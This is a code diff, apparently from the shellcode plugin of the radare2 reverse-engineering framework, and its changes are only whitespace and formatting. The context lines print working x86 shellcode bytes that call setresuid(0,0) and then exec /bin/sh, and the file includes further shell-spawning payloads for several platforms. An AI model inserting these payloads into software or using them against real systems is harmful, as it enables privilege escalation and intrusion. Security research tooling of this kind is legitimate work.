@@ -7,38 +7,37 @@
 linux setresuid(0,0)+execv(/bin/sh)
 31c031db31c999b0a4cd806a0b5851682f2f7368682f62696e89e35189e25389e1cd80
 
-SETRESUID: (11 bytes)
+SETRESUID:(11 bytes)
 "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80"
 
-BINSH: (24 bytes) (x86-32/64):
+BINSH:(24 bytes)(x86-32/64):
 "\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";
 #endif
 
 static const ut8 x86_osx_suid_binsh[] =
 #include "sc/out/x86-osx-suidbinsh.c"
-;
+	;
 
 static const ut8 x86_osx_binsh[] =
 #include "sc/out/x86-osx-binsh.c"
-;
+	;
 
 // linux
 static const ut8 x86_linux_binsh[] =
 #include "sc/out/x86-linux-binsh.c"
-;
+	;
 
 static const ut8 x86_64_linux_binsh[] =
 #include "sc/out/x86_64-linux-binsh.c"
-;
+	;
 
 static const ut8 arm_linux_binsh[] =
 #include "sc/out/arm-linux-binsh.c"
-;
+	;
 
 static const ut8 thumb_linux_binsh[] =
 #include "sc/out/thumb-linux-binsh.c"
-;
-
+	;
 
 static RBuffer *build(REgg *egg) {
 	RBuffer *buf = r_buf_new ();
@@ -51,7 +50,7 @@ static RBuffer *build(REgg *egg) {
 	bool append_shellcode = true;
 	char *opt_cmd = r_egg_option_get (egg, "cmd");
 	char *suid = r_egg_option_get (egg, "suid");
-	// TODO: last char must not be \x00 .. or what? :D
+	// TODO: last char must not be \x00 .. or what?: D
 	if (suid && *suid == 'f') { // false
 		free (suid);
 		suid = NULL;
